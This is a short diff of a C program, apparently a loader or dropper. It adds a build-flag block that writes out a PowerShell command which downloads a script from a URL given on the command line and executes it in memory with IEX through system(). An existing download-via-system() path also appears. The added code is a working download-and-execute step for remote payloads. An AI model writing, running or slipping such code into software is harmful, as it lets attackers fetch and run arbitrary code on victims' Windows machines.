@@ -103,6 +103,15 @@ int main (int argc, char **argv)
 	system(download);
 #endif
 
+#ifdef DOWNLOADPOWERSHELL
+	char download[500];
+	sprintf(download,"powershell.exe \"IEX ((new-object net.webclient).downloadstring('%s'))\"",argv[2]);
+	#ifdef PRINT_DEBUG
+		printf("url: %s\n", download);
+	#endif
+	system(download);
+#endif
+
 	#ifdef LVALUE
 		fvalue=argv[1];
 	#endif
